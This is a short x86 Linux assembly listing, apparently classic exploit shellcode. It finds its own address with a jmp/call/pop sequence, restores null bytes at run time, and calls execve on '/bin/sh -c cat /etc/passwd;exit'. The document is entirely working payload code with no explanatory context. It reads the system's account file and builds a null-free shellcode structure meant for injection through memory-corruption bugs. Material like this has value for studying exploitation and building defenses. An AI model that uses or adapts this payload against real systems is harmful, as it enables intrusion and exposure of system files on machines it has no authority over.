            bits 32
            ; find out where we are
start:      jmp short codeEnd
start2:     pop esi

            ; restore null bytes in data  
            xor eax, eax
            mov [byte esi+flagStr-exeStr-1],al    
            mov [byte esi+cmdStr-exeStr-1],al
            mov [byte esi+arrayAddr-exeStr-1],al
            mov [byte esi+arrayAddr-exeStr+12],eax

            mov [byte esi+arrayAddr-exeStr], esi
            lea edi, [byte esi+flagStr-exeStr]
            mov [byte esi+arrayAddr-exeStr+4], edi
            lea edi, [byte esi+cmdStr-exeStr]
            mov [byte esi+arrayAddr-exeStr+8],edi

            ; setup registers and make system call.         
            mov al,0x0b
            mov ebx,esi
            lea ecx,[byte esi+arrayAddr-exeStr]
            xor edx,edx
            int 0x80
codeEnd:    call start2

            ; data
exeStr:     db "/bin/shXy"
flagStr:    db "-cX"
cmdStr:     db "cat /etc/passwd;exitX"
arrayAddr:  dd 0xffffffff
            dd 0xffffffff
            dd 0xffffffff
            dd 0xffffffff

newAddr:    dd newAddr-start